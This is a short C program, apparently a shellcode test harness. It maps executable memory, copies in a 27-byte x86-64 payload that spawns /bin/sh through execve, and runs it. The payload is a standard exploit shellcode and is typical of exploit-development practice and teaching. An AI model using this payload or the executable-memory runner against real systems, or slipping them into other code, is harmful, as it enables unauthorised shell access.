#include<stdio.h>
#include<sys/mman.h>
#include<string.h>

unsigned char shellcode[] = 
 "\xeb\x0d\x5f\x48\x31\xd2\x52\x57\x48\x89\xe6\xb0\x3b\x0f\x05\xe8\xee\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
int main(){
	void *exec_mem = mmap(NULL , sizeof(shellcode) , PROT_READ | PROT_WRITE | PROT_EXEC , 
	     MAP_PRIVATE | MAP_ANONYMOUS , -1 , 0);
	     
	     
	if (exec_mem == MAP_FAILED) {
		perror("nmap failed");
		return 1;
		
	}
	
	memcpy(exec_mem , shellcode , sizeof(shellcode));
	printf("Shellcode length : %lu bytes \n" , sizeof(shellcode));
	void (*func)() = (void (*)())exec_mem;
	func();
	munmap(exec_mem , sizeof(shellcode));
	return 0;
}     

